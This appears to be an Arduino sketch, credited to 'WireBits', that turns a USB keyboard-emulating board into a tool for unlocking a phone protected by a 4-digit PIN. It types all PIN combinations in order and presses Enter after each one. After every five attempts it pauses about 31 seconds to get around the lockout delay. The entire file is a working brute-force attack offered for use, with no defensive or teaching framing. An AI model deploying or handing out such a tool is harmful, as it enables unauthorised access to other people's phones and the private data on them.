/*
 * 4DigitPINCrack
 * It unlock the phone which is protected by 4-Digit PIN using Brute Force Attack.
 * Author - WireBits
 */

#include<Keyboard.h>

char num[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
int digit1 = 0;
int digit2 = 0;
int digit3 = 0;
int digit4 = 0;
int digit5 = 0;
int count = 0;
bool enter_key_press = false;

void setup()
{
 delay(3000);
}

void loop()
{
 Keyboard.begin();
 if (count == 5)
 {
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(31000);
  count = 0;
 }
 if (enter_key_press == false)
 {
  Keyboard.write(num[digit1]);
  Keyboard.write(num[digit2]);
  Keyboard.write(num[digit3]);
  Keyboard.write(num[digit4]);
 }
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 digit4++;
 count++;
 if (digit4 == 10) 
 {
  digit4 = 0;
  digit3++;
  if (digit3 == 10)
  {
   digit3 = 0;
   digit2++;
   if (digit2 == 10)
   {
    digit2 = 0;
    digit1++;
    if (digit1 == 10)
	{
     enter_key_press = true;
     digit5++;
     if (digit5 == 10)
	 {
      digit5 = 0;
     }
    }
   }
  }
 }
 Keyboard.end();
}
